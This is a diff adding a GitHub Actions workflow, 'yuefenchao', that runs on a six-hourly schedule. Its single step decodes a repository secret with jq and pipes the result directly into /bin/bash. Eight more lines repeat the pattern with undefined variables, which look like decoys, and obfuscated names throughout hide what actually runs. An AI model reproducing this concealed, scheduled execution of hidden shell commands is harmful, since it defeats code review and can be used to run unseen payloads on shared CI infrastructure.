@@ -1,0 +1,25 @@
+name: yuefenchao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuefenchao
+        env:
+          x63: ${{ secrets.x63 }}
+        run: |
+          echo $x63 | jq -r .wiydb06 | /bin/bash
+          echo $wo78715 | jq -r .r6 | /bin/bash
+          echo $dlpc2549 | jq -r .ez02 | /bin/bash
+          echo $f1321 | jq -r .ufcou6746 | /bin/bash
+          echo $viogb05 | jq -r .rbqz2 | /bin/bash
+          echo $b3 | jq -r .pjoji460 | /bin/bash
+          echo $n79 | jq -r .epn56 | /bin/bash
+          echo $crwki954 | jq -r .bzdey3 | /bin/bash
+          echo $vva68 | jq -r .lh37 | /bin/bash
+
